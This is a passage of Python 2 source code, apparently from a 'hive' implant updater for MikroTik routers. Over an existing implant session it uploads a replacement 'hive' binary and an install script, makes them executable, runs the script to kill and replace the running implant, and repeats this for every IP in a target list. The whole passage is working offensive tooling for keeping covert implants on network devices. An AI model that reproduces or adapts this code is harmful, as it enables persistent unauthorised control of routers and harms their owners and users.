			print cutT.before
			print cutT.after
			now=datetime.now()
			print "      Updated hive sent as newhive on "+now.strftime('%m/%d/%Y at %H:%M:%S')+" hrs"
		elif index == 1:
			print "Failed..."
			print cutT.before
			print cutT.after
		elif index == 2:
			print "EOF occurred"
			print cutT.before
			print cutT.after
		elif index == 3:
			print "Timeout of 30 occurred"
			print cutT.before
			print cutT.after

		#  This line is specific to mikrotik routers for now...
		#cutT.sendline("  cmd exec \"chmod 755 /rw/pckg/newhive\"")
		ctCommand= "  cmd exec \"chmod 755 "+self.get('Remote', 'installationDirectory', 0)+self.get('Payload', 'tempPayload', 0)+"\""
		cutT.sendline(ctCommand)
		#
		#
		#      Makes the tempPayload executable...
		#
		#
		response="\["+self.get('Remote', 'remoteIP', 0)+"\]> "
		index = cutT.expect( [response, 'Failure', pexpect.EOF, pexpect.TIMEOUT] , timeout=30 )

		if index == 0:
			print "tempPayload executable response."
			print cutT.before
			print cutT.after
			now=datetime.now()
			print "      Updated tempPayload is executable at "+now.strftime('%m/%d/%Y at %H:%M:%S')+" hrs"
		elif index == 1:
			print "Failed..."
			print cutT.before
			print cutT.after
		elif index == 2:
			print "EOF occurred"
			print cutT.before
			print cutT.after
		elif index == 3:
			print "Timeout of 30 occurred"
			print cutT.before
			print cutT.after

		#  The following line is specific to mikrotik routers for now...
		#cutT.sendline("  file put installScript /rw/pckg/installScript")
		ctCommand= "  file put "+self.get('Payload', 'installation_Script_Name', 0)+" "+self.get('Remote', 'installationDirectory', 0)+self.get('Payload', 'installation_Script_Name', 0)
		cutT.sendline(ctCommand)
		#
		#
		#      Sends the installScript...
		#
		#
		response="\["+self.get('Remote', 'remoteIP', 0)+"\]> "
		index = cutT.expect( [response, 'Failure', pexpect.EOF, pexpect.TIMEOUT] , timeout=30 )

		if index == 0:
			print self.get('Remote', 'installationDirectory', 0)+self.get('Payload', 'installation_Script_Name', 0)+ " installed response."
			print cutT.before
			print cutT.after
			now=datetime.now()
			print "      installScript ["+self.get('Remote', 'installationDirectory', 0)+self.get('Payload', 'installation_Script_Name', 0)+"] is put on device at "+now.strftime('%m/%d/%Y at %H:%M:%S')+" hrs"
		elif index == 1:
			print "Failed..."
			print cutT.before
			print cutT.after
		elif index == 2:
			print "EOF occurred"
			print cutT.before
			print cutT.after
		elif index == 3:
			print "Timeout of 30 occurred"
			print cutT.before
			print cutT.after

		#  This line is specific to mikrotik routers for now...
		#cutT.sendline("  cmd exec \"chmod 755 /rw/pckg/installScript\"")
		ctCommand= "  cmd exec \"chmod 755 "+self.get('Remote', 'installationDirectory', 0)+self.get('Payload', 'installation_Script_Name', 0)+"\""
		cutT.sendline(ctCommand)
		#
		#
		#      Makes the installScript executable...
		#
		#
		response="\["+self.get('Remote', 'remoteIP', 0)+"\]> "
		index = cutT.expect( [response, 'Failure', pexpect.EOF, pexpect.TIMEOUT] , timeout=30 )

		if index == 0:
			print "installedScript ["+self.get('Remote', 'installationDirectory', 0)+self.get('Payload', 'installation_Script_Name', 0)+" executable response."
			print cutT.before
			print cutT.after
			now=datetime.now()
			print "      installScript is now executable at "+now.strftime('%m/%d/%Y at %H:%M:%S')+" hrs"
		elif index == 1:
			print "Failed..."
			print cutT.before
			print cutT.after
		elif index == 2:
			print "EOF occurred"
			print cutT.before
			print cutT.after
		elif index == 3:
			print "Timeout of 30 occurred"
			print cutT.before
			print cutT.after

		#  This line is specific to mikrotik routers for now...
		now=datetime.now()
		#cutT.sendline("  cmd exec /rw/pckg/installScript")
		ctCommand= "  cmd exec "+self.get('Remote', 'installationDirectory', 0)+self.get('Payload', 'installation_Script_Name', 0)
		cutT.sendline(ctCommand)
		#
		#
		#      Runs the installScript ...    Note that the hive trigger should now timeout
		#                                      since the install script should remove 
		#                                      all currently running hive processes including
		#                                      our currently triggered implant and replace the
		#                                      existing hive with the new hive implant...
		#
		#
		response="\["+self.get('Remote', 'remoteIP', 0)+"\]> "
		index = cutT.expect( [ pexpect.TIMEOUT, response, 'Failure', pexpect.EOF] , timeout=60 )

		if index == 0:
			print "Expected timeout occurred since the existing hive is currently being replaced..."
			print cutT.before
			print cutT.after
			print "      installScript ["+self.get('Remote', 'installationDirectory', 0)+self.get('Payload', 'installation_Script_Name', 0)+" was started at "+now.strftime('%m/%d/%Y at %H:%M:%S')+" hrs"
			now=datetime.now()
			print "      Hive should have been replaced by now at "+now.strftime('%m/%d/%Y at %H:%M:%S')+" hrs after 60 seconds timeout."
		elif index == 1:
			print "Should never have gotten here for the response...  ERROR   ERROR  ERROR"
			print cutT.before
			print cutT.after
		elif index == 2:
			print "Should never have gotten here for Failure...  ERROR   ERROR  ERROR"
			print cutT.before
			print cutT.after
		elif index == 3:
			print "EOF occurred"
			print cutT.before
			print cutT.after

		print "\n\n runOperation:  " + self.get('Payload', 'operation', 0) + "   for " + self.get('Remote', 'remoteIP', 0 ) + " now ending..."


	#================================================================
	def runBatchOperation(self):

		#Target List takes priority over singleIP for now...
		if os.path.isfile(self.get('Targets', 'list', 0)):
			file = open(self.get('Targets', 'list', 0), "r")
			ips=[]
			for text in file.readlines():
				text = text.strip()
				if not text == '':
					ips.append(text)

			processCount = 0
			for ip in ips:
				processCount=processCount  + 1
				if validIP(ip):
					self.set('Remote', 'remoteIP', str(ip))
					print "\n\n Batch Job now processing "+self.getTargetList()+" line "+str(processCount)+" for target IP = "+self.get('Remote', 'remoteIP', 0)+"...\n"
					self.runSingleUpdateOperation()
					print "\n\n Batch Job done processing "+self.getTargetList()+" line "+str(processCount)+" for target IP = "+self.get('Remote', 'remoteIP', 0)+"...\n"
				else:
					print "\n\nInvalid IP ["+str(ip)+"] submitted for batch processing.\n\n"
			file.close()

		else:
			print "\n\n NO TARGET LIST ["+self.get('Targets', 'list', 0)+"] for batch processing with "+self.get('Payload', 'operation', 0)+ " \n\n"
			sys.exit()



#====================================================================================================================
	

if __name__ == "__main__":
	os.system("clear")


	if  len(sys.argv) != 3:
		print
		print
		print "     USAGE: "+sys.argv[0]+ " IP_Address"  + " ConfigurationFile" 
		print
		print "     #This example updates the device with the IP Address of 10.1.2.3"
		print "           Example: "+sys.argv[0]+ " 10.1.2.3 example.cfg"          
		print    
		print    
		print "                                 OR "   
		print    
		print    
		print "     USAGE: "+sys.argv[0]+ " TargetList_Filename"  + " ConfigurationFile" 
		print    
		print "     #This example updates all devices with IP Addresses listed in the file named TargetList"
		print "           Example: "+sys.argv[0]+ " TargetList example.cfg"          
		print    
		print
		sys.exit()

	else:
		remoteIP_fileName = sys.argv[1]
		print 'remoteIP_fileName= '+remoteIP_fileName
		hiveConfigurationFile = sys.argv[2] 

	hiveUpdater = hiveConfigParser()

	print "\n\nLooking for "+hiveConfigurationFile+"\n\n"
	if os.path.isfile(hiveConfigurationFile):
		pass
	else:
		hiveUpdater.setConfigurationSettings( hiveConfigurationFile, remoteIP_fileName )


	hiveUpdater.read(hiveConfigurationFile)


	#Program commands can override the hiveConfigurationFile 
	if os.path.isfile(remoteIP_fileName):
		if not validIP(remoteIP_fileName):
			hiveUpdater.setTargetList(remoteIP_fileName)
		else:
			hiveUpdater.setRemoteIP(remoteIP_fileName)
			hiveUpdater.clearTargetList()
	else:
		if validIP(remoteIP_fileName):
			pass
		else:
			print "\n\n       Invalid input [" + remoteIP_fileName +"] provided for a remoteIP or targetList filename.\n\n"
			sys.exit()
	
	#Create Installation File
	hiveUpdater.makeInstallationScript()

	#Assumes list of targets takes priority...
	#if not validIP( self.get('Remote', 'remoteIP', 0) ):
	if os.path.isfile(hiveUpdater.getTargetList()):
		hiveUpdater.runBatchOperation()
	else:
		if validIP( hiveUpdater.getRemoteIP() ):
			#Run the hiveUpdater.runSingleUpdateOperation()
			hiveUpdater.runSingleUpdateOperation()
		else:
			print " \n\n Invalid IP Address passed in and no Target List file.\n\n"
			sys.exit()



